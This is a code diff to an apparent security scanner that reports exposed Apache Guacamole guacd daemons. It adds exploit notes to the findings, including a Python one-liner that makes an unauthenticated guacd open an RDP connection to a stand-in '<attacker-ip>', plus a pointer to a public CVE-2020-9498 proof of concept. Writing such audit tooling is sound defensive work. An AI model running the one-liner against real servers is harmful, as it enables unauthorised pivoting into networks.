@@ -212,10 +212,12 @@ def guacd_targets(hosts: list[Host]) -> list[dict]:
     return out
 
 
-def _finding(sev, title, target, detail, cmd, rem, cwes, kind=""):
+def _finding(sev, title, target, detail, cmd, rem, cwes, kind="",
+             exploit_note="", depth_tier=""):
     return {"severity": sev, "title": title, "target": target, "detail": detail,
             "tool": "nc", "command": cmd, "remediation": rem,
-            "cwes": cwes, "kind": kind}
+            "cwes": cwes, "kind": kind,
+            "exploit_note": exploit_note, "depth_tier": depth_tier}
 
 
 def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
@@ -254,7 +256,16 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                 "another host, put guacd behind a firewall / private "
                 "management network and require mutual TLS on the guacd "
                 "listener (guacd-ssl.crt + guacd-ssl.key).",
-                ["CWE-306", "CWE-918"], kind="guacd_exposed"))
+                ["CWE-306", "CWE-918"], kind="guacd_exposed",
+                exploit_note=(
+                    "python3 -c 'import socket;s=socket.create_connection("
+                    "(\"<ip>\",<port>));s.sendall(b\"6.select,3.rdp;\");"
+                    "print(s.recv(4096));s.sendall(b\"4.size,4.1024,3.768,"
+                    "2.96;5.audio,0;5.video,0;5.image,0;8.timezone,0;"
+                    "8.hostname,15.<attacker-ip>,4.port,4.3389,7.security,"
+                    "3.any;\");print(s.recv(4096))'   # watch tcpdump -ni "
+                    "any port 3389 on the attacker"),
+                depth_tier="t1"))
             # Version-gated CVEs. Never emit without a parsed version.
             if _version_lt(version, (1, 2, 0)):
                 out.append(_finding(
@@ -275,7 +286,13 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "possible, disable the RDP protocol plugin on guacd "
                     "(remove libguac-client-rdp.so) and restrict 4822 to "
                     "loopback.",
-                    ["CWE-416"], kind="guacd_cve_2020_9498"))
+                    ["CWE-416"], kind="guacd_cve_2020_9498",
+                    exploit_note=(
+                        "See Check Point 2020-07-02 write-up 'Reverse RDP - "
+                        "The Path Not Taken'; PoC at "
+                        "github.com/checkpoint-research/CVE-2020-9498. "
+                        "Lab-only - it heap-corrupts guacd."),
+                    depth_tier="t0"))
                 out.append(_finding(
                     "medium",
                     "Apache Guacamole guacd < 1.2.0 memory disclosure "
